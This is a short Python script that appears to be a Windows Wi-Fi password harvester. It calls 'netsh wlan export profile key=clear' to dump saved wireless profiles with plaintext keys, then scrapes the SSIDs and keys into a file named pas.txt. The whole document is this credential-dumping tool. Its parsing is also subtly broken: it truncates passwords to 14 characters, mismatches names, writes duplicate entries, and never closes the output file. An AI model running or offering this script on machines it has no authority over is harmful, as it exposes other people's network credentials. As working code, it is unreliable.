import subprocess 
 
import os
import sys
pf=open('pas.txt',"w")
pf.write("pas:\n\n")
pf.close()

wf=[]
wn=[]
wp=[]

cm=subprocess.run(["netsh","wlan","export","profile","key=clear"],capture_output=True).stdout.decode()

path=os.getcwd()

for fn in os.listdir(path):
    if fn.startswith("Wi-Fi") and fn.endswith(".xml"):
        wf.append(fn)
        for i in wf:
            with open(i,'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped=line.strip()
                        front=stripped[6:]
                        back=front[:-7]
                        wn.append(back)
                    if 'keyMaterial' in line:
                        stripped=line.strip()
                        front=stripped[13:]
                        back=front[:14]
                        wp.append(back)
                        for x,y in zip(wn,wp):
                            sys.stdout=open('pas.txt',"a")
                            print("SSID: "+x,"Password: "+y,sep='\n')
                            sys.stdout.close